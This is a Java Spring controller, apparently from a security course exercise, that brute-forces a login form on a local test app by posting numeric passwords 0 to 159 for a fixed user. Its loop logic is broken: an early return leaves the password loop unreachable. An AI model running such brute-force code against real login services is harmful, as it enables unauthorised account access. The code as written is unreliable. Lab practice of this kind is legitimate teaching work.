package example.itsec_group_exercise2.controller;

import example.itsec_group_exercise2.service.ConnecterToLogin;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.http.*;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.client.WebClient;
import reactor.core.publisher.Mono;

import java.time.Duration;
import java.util.Objects;

@Component
@RestController
@RequestMapping("/bruteforce")
public class BruteForceController {

    ConnecterToLogin connecterToLogin;

    @Autowired
    public BruteForceController(ConnecterToLogin connecterToLogin) {
        this.connecterToLogin = connecterToLogin;
    }

    @GetMapping
    public String getPassword() {

        String response = null;

        while (!Objects.equals(response, "http://localhost:9050/")) {

        System.out.println("connector called");


        return connecterToLogin.tryPasswords("159");
            for (int i = 0; i < 160; i++) {
                response = createClient(String.valueOf(i));
                System.out.println("test nr " + i);
            }
        }
        return response;
    }

    @GetMapping("/dictionary")
    public String getPassword2() {
        return "password";
    }

    WebClient webClient = WebClient.builder()
            .baseUrl("http://localhost:9050")
            .defaultHeader(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_FORM_URLENCODED_VALUE)
            .build();

    public String createClient(String password) {

        MultiValueMap<String, String> formData = new LinkedMultiValueMap<>();
        formData.add("username", "User");
        formData.add("password", password);

        return webClient.post()
                .uri("/login")
                .contentType(MediaType.APPLICATION_FORM_URLENCODED)
                .body(BodyInserters.fromFormData(formData))
                .exchangeToMono(response -> {
                    if (response.statusCode().equals(HttpStatus.FOUND)) {
                        String location = response.headers().header("Location").get(0);

                        return Mono.just(location);
                    }
                    return Mono.just("Failed");
                })
                .block(Duration.ofSeconds(3));
    }
}
